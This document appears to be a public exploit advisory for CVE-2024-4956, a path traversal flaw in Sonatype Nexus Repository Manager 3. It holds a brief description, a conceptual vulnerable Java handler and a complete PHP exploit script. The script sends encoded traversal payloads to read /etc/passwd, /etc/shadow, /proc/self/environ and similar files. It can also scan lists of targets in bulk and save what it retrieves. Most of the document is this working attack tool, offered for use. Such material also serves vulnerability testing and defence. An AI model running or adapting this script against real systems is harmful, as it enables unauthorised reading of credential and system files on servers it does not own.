@@ -1,0 +1,368 @@
+=============================================================================================================================================
+| # Title     : Nexus Repository Manager v 3.53.0-01 read arbitrary files                                                                   |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.sonatype.com/products/sonatype-nexus-repository                                                                 |
+=============================================================================================================================================
+
+POC : 
+
+[+] References : https://packetstorm.news/files/id/181661/ & 	CVE-2024-4956
+
+
+[+] Summary :
+
+A critical path traversal vulnerability exists in Sonatype Nexus Repository Manager 3 that allows unauthenticated attackers to read arbitrary files from the server filesystem through crafted URL paths.
+The vulnerability enables complete system file disclosure without authentication.
+
+[+] Technical Description
+
+The vulnerability exists in Nexus Repository Manager's URL parsing and file serving functionality. 
+The application fails to properly validate and sanitize URL paths containing encoded directory traversal sequences, allowing attackers to bypass file access restrictions and read arbitrary files from the server filesystem.
+
+Vulnerable Code Pattern:
+
+java
+
+// Conceptual vulnerable code in file serving component
+@GET
+@Path("/{filePath:.*}")
+public Response serveFile(@PathParam("filePath") String filePath) {
+    // Insufficient path normalization
+    String resolvedPath = resolveFilePath(filePath);
+    
+    // No proper traversal detection
+    File file = new File(baseDirectory, resolvedPath);
+    
+    if (file.exists()) {
+        return Response.ok(file).build();
+    }
+    return Response.status(404).build();
+}
+
+[+] Usage: 
+
+# Check a single target
+
+php exploit.php -u 192.168.1.100:8081
+
+# Check a list of targets
+
+php exploit.php -l targets.txt
+
+# Test additional paths
+
+php exploit.php -t 192.168.1.100:8081
+
+# Show help
+
+php exploit.php -h
+
+[+] POC :
+
+<?php
+/**
+ * CVE-2024-4956 Exploit - Nexus Repository Manager Path Traversal
+ * By: indoushka
+ * Converted from Python to PHP
+ */
+
+class NexusExploit {
+    private $colors;
+    
+    public function __construct() {
+        $this->colors = [
+            'GREEN'   => "\033[1;32m",
+            'MAGENTA' => "\033[1;35m",
+            'CYAN'    => "\033[1;36m",
+            'RED'     => "\033[1;31m",
+            'BLUE'    => "\033[1;34m",
+            'YELLOW'  => "\033[1;33m",
+            'WHITE'   => "\033[1;37m",
+            'RESET'   => "\033[0m",
+            'BOLD'    => "\033[1m"
+        ];
+        
+        // Initialize color array for random selection
+        $this->colorArray = [
+            $this->colors['GREEN'],
+            $this->colors['CYAN'], 
+            $this->colors['BLUE']
+        ];
+    }
+    
+    private function color($text, $color) {
+        return $this->colors[$color] . $text . $this->colors['RESET'];
+    }
+    
+    private function randomColor() {
+        return $this->colorArray[array_rand($this->colorArray)];
+    }
+    
+    private function showBanner() {
+        $randomColor = $this->randomColor();
+        
+        $banner = $randomColor . "
+
+" . $this->colors['RESET'] . 
+$this->colors['MAGENTA'] . "
+ 
+" . $this->colors['RESET'] .
+$this->colors['RED'] . "\n        CVE-2024-4956 - Nexus Repository Manager Path Traversal\n" . $this->colors['RESET'] .
+$this->colors['WHITE'] . "                    @indoushka\n\n" . $this->colors['RESET'];
+
+        echo $banner;
+    }
+    
+    private function readTargetList($filePath) {
+        if (!file_exists($filePath)) {
+            echo $this->color("[-] File not found: " . $filePath, 'RED') . "\n";
+            return [];
+        }
+        
+        $lines = file($filePath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+        return array_map('trim', $lines);
+    }
+    
+    private function makeRequest($target, $urlPath) {
+        $url = "http://" . $target . "/" . $urlPath;
+        
+        $context = stream_context_create([
+            'http' => [
+                'timeout' => 5,
+                'ignore_errors' => true,
+                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            ]
+        ]);
+        
+        $response = @file_get_contents($url, false, $context);
+        
+        if ($response === false) {
+            return null;
+        }
+        
+        return $response;
+    }
+    
+    private function isVulnerableResponse($response, $urlPath) {
+        // Check for false positives
+        $falsePositives = [
+            "nexus:x:200:200:Nexus Repository Manager user:/opt/sonatype/nexus:/bin/false",
+            "Not Found",
+            "400 Bad Request",
+            "404 Not Found"
+        ];
+        
+        foreach ($falsePositives as $fp) {
+            if (stripos($response, $fp) !== false) {
+                return false;
+            }
+        }
+        
+        // Check for positive indicators
+        if (strpos($urlPath, 'passwd') !== false && strpos($response, 'root:') !== false) {
+            return true;
+        }
+        
+        if (strpos($urlPath, 'shadow') !== false && strpos($response, 'root:') !== false) {
+            return true;
+        }
+        
+        return false;
+    }
+    
+    public function scanSingleTarget($target) {
+        $this->showBanner();
+        
+        echo $this->color("[*] Scanning target: ", 'BLUE') . $target . "\n\n";
+        
+        $testPaths = [
+            "%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F../etc/passwd",
+            "%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F../etc/shadow"
+        ];
+        
+        $vulnerable = false;
+        
+        foreach ($testPaths as $path) {
+            echo $this->color("[*] Testing path: ", 'YELLOW') . $path . "\n";
+            
+            $response = $this->makeRequest($target, $path);
+            
+            if ($response !== null && $this->isVulnerableResponse($response, $path)) {
+                echo $this->color("[+] VULNERABLE! File accessed successfully", 'GREEN') . "\n";
+                echo $this->color("[+] File contents:\n", 'GREEN');
+                echo $this->color(str_repeat("=", 60), 'CYAN') . "\n";
+                echo $response . "\n";
+                echo $this->color(str_repeat("=", 60), 'CYAN') . "\n";
+                $vulnerable = true;
+                break;
+            } else {
+                echo $this->color("[-] Not vulnerable via this path", 'RED') . "\n";
+            }
+        }
+        
+        if (!$vulnerable) {
+            echo $this->color("\n[-] Target does not appear to be vulnerable", 'RED') . "\n";
+        }
+        
+        return $vulnerable;
+    }
+    
+    public function scanTargetList($targetList) {
+        $this->showBanner();
+        
+        echo $this->color("[*] Scanning multiple targets...\n", 'BLUE');
+        echo $this->color("[*] Targets to scan: " . count($targetList), 'BLUE') . "\n\n";
+        
+        $testPaths = [
+            "%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F../etc/passwd",
+            "%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F../etc/shadow"
+        ];
+        
+        $vulnerableTargets = [];
+        
+        foreach ($targetList as $index => $target) {
+            echo $this->color("[" . ($index + 1) . "/" . count($targetList) . "] Testing: ", 'BLUE') . $target . "\n";
+            
+            foreach ($testPaths as $path) {
+                $response = $this->makeRequest($target, $path);
+                
+                if ($response !== null && $this->isVulnerableResponse($response, $path)) {
+                    echo $this->color("[+] VULNERABLE: " . $target, 'GREEN') . "\n";
+                    
+                    $vulnerableTargets[] = [
+                        'target' => $target,
+                        'path' => $path,
+                        'content' => $response
+                    ];
+                    
+                    // Save results to file
+                    $filename = "vulnerable_" . str_replace([':', '/', '\\'], '_', $target) . ".txt";
+                    file_put_contents($filename, "Target: " . $target . "\nPath: " . $path . "\n\n" . $response);
+                    echo $this->color("[+] Results saved to: " . $filename, 'CYAN') . "\n";
+                    break 2; // Break both loops
+                }
+            }
+            
+            echo $this->color("[-] Not vulnerable", 'RED') . "\n";
+        }
+        
+        // Summary
+        echo $this->color("\n" . str_repeat("=", 60), 'CYAN') . "\n";
+        echo $this->color("[*] SCAN SUMMARY", 'BOLD') . "\n";
+        echo $this->color(str_repeat("=", 60), 'CYAN') . "\n";
+        echo $this->color("[+] Total targets scanned: ", 'BLUE') . count($targetList) . "\n";
+        echo $this->color("[+] Vulnerable targets found: ", 
+            count($vulnerableTargets) > 0 ? 'GREEN' : 'RED') . count($vulnerableTargets) . "\n";
+        
+        if (count($vulnerableTargets) > 0) {
+            echo $this->color("[+] Vulnerable targets:", 'GREEN') . "\n";
+            foreach ($vulnerableTargets as $vt) {
+                echo "  - " . $vt['target'] . "\n";
+            }
+        }
+    }
+    
+    public function testAdditionalPaths($target) {
+        $this->showBanner();
+        
+        echo $this->color("[*] Testing additional paths on: ", 'BLUE') . $target . "\n\n";
+        
+        $additionalPaths = [
+            "%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F../etc/hosts" => "System hosts file",
+            "%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F../etc/group" => "System groups file",
+            "%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F../proc/version" => "Kernel version",
+            "%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F../proc/self/environ" => "Process environment"
+        ];
+        
+        foreach ($additionalPaths as $path => $description) {
+            echo $this->color("[*] Testing: ", 'YELLOW') . $description . "\n";
+            echo $this->color("[*] Path: ", 'CYAN') . $path . "\n";
+            
+            $response = $this->makeRequest($target, $path);
+            
+            if ($response !== null && !$this->isFalsePositive($response)) {
+                echo $this->color("[+] ACCESSIBLE: " . $description, 'GREEN') . "\n";
+                echo $this->color("[+] Content preview:\n", 'GREEN');
+                echo substr($response, 0, 500) . "\n\n";
+                
+                // Save to file
+                $filename = $description . "_" . str_replace([':', '/', '\\'], '_', $target) . ".txt";
+                file_put_contents($filename, $response);
+                echo $this->color("[+] Saved to: " . $filename, 'CYAN') . "\n\n";
+            } else {
+                echo $this->color("[-] Not accessible", 'RED') . "\n\n";
+            }
+        }
+    }
+    
+    private function isFalsePositive($response) {
+        $falsePositives = [
+            "nexus:x:200:200:Nexus Repository Manager",
+            "Not Found",
+            "Bad Request",
+            "404",
+            "400"
+        ];
+        
+        foreach ($falsePositives as $fp) {
+            if (stripos($response, $fp) !== false) {
+                return true;
+            }
+        }
+        
+        return false;
+    }
+}
+
+// Main execution
+if (php_sapi_name() === 'cli') {
+    $shortOptions = "u:l:t:h";
+    $longOptions = ["url:", "list:", "test:", "help"];
+    
+    $options = getopt($shortOptions, $longOptions);
+    
+    if (isset($options['h']) || isset($options['help']) || empty($options)) {
+        echo "CVE-2024-4956 - Nexus Repository Manager Path Traversal Exploit\n";
+        echo "Usage:\n";
+        echo "  php exploit.php -u <target_url>\n";
+        echo "  php exploit.php -l <targets_list.txt>\n";
+        echo "  php exploit.php -t <target_url>\n";
+        echo "\nExamples:\n";
+        echo "  php exploit.php -u 192.168.1.100:8081\n";
+        echo "  php exploit.php -l targets.txt\n";
+        echo "  php exploit.php -t 192.168.1.100:8081\n";
+        echo "\nDescription:\n";
+        echo "  Exploits path traversal vulnerability in Nexus Repository Manager (CVE-2024-4956)\n";
+        echo "  Allows reading arbitrary files from the server filesystem\n";
+        exit(0);
+    }
+    
+    $exploit = new NexusExploit();
+    
+    if (isset($options['u']) || isset($options['url'])) {
+        $target = $options['u'] ?? $options['url'];
+        $exploit->scanSingleTarget($target);
+    } 
+    elseif (isset($options['l']) || isset($options['list'])) {
+        $listFile = $options['l'] ?? $options['list'];
+        $targets = $exploit->readTargetList($listFile);
+        
+        if (!empty($targets)) {
+            $exploit->scanTargetList($targets);
+        } else {
+            echo "Error: No valid targets found in list file\n";
+        }
+    }
+    elseif (isset($options['t']) || isset($options['test'])) {
+        $target = $options['t'] ?? $options['test'];
+        $exploit->testAdditionalPaths($target);
+    }
+} else {
+    echo "This script is intended for command line use only.\n";
+}
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
